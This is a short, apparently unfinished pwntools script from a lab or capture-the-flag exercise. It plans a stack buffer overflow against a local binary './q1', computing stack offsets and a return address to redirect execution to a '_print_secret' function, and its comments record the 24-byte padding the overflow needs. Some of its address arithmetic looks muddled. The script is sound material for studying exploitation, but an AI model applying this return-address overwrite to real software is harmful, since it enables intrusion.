#for function parse_stdin():
#rip at 0x7fffffffdce8

#buffer at 0x7fffffffdcd0

#_print_secret at 0x4012fd

#need to input 24 \x9 first, then the return address

from pwn import *
print(0xe8-0xd0)


offset = 0x7fffffffdcd0-0x4012fd

actual_print_secret = 0x7fffffffdd70 - offset
print(hex(actual_print_secret))


p = process("./q1")

print(p.recvline())


return_addr = 0x40139d
print(0x9d)
print(0x13)
print(0x40)
